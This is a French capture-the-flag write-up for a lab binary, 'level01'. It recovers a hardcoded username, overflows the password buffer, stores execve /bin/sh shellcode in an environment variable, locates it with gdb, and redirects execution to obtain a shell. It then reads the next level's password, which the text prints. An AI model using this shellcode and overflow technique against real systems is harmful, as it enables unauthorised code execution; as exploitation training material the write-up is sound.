# Level1

On observe que l'executable prend une entre sur l'entre standard

```shell
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: Hello World
verifying username....

nope, incorrect username...
```

On regarde l'assembleur et on remarque qu'il compare notre entre de `Username` a
`dat_wil`. On peut alors utiliser un shellcode car l'entre de `Password` utilise un `strcmp()`

```shell
$ python -c 'print("dat_wil\n" + "A"*79)' | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

$ python -c 'print("dat_wil\n" + "A"*80)' | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

Segmentation fault (core dumped)
```

On va mettre notre shellcode dans une variable d'environnement et regarder son adresse

```shell
$ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')

$ gdb level01 -q
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.

(gdb) b *main
Breakpoint 1 at 0x80484d0

(gdb) run
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d0 in main ()

(gdb) x/s *((char **)environ)
0xffffd860: "Shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343P\211\341P\211\342\260\v̀"
```

Assemblons toute les pieces

```shell
$ (python -c 'print("dat_wil\n" + "A"*80 + "\xff\xff\xd8\x80"[::-1])'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
